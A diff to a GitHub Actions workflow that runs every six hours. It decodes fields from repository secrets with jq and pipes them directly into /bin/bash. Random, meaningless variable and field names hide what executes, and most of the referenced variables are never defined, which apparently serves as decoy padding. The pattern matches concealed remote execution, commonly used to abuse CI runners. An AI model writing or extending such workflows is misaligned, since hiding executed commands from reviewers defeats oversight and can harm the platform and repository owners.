@@ -3,18 +3,30 @@ name: dashengwanglei
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 1/6 * * *'
+    - cron: '0 2/6 * * *'
 
-jobs:  # 23666
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dashengwanglei
         env:
-          x5: ${{ secrets.x5 }}
+          zocqi1: ${{ secrets.zocqi1 }}
         run: |
-          echo $x5 | jq -r .btr172 | /bin/bash
-          echo $wws7 | jq -r .pwl1375 | /bin/bash
-          echo $q526 | jq -r .lq607 | /bin/bash
+          echo $zocqi1 | jq -r .zlgn3 | /bin/bash
+          echo $xiqs87 | jq -r .wbqh42089 | /bin/bash
+          echo $fafr0915 | jq -r .gibbk68 | /bin/bash
+          echo $crbad99 | jq -r .sym410 | /bin/bash
+          echo $zl02723 | jq -r .q55416 | /bin/bash
+          echo $whzs4 | jq -r .kl2533 | /bin/bash
+          echo $kqzi3 | jq -r .ef80 | /bin/bash
+          echo $nhfja9 | jq -r .f3159 | /bin/bash
+          echo $v4009 | jq -r .wzulz65062 | /bin/bash
+          echo $j5808 | jq -r .fw2187 | /bin/bash
+          echo $g65686 | jq -r .vc8 | /bin/bash
+          echo $fjmy68 | jq -r .gi4 | /bin/bash
+          echo $qs4 | jq -r .wevma302 | /bin/bash
+          echo $bmzc1355 | jq -r .ak8931 | /bin/bash
 
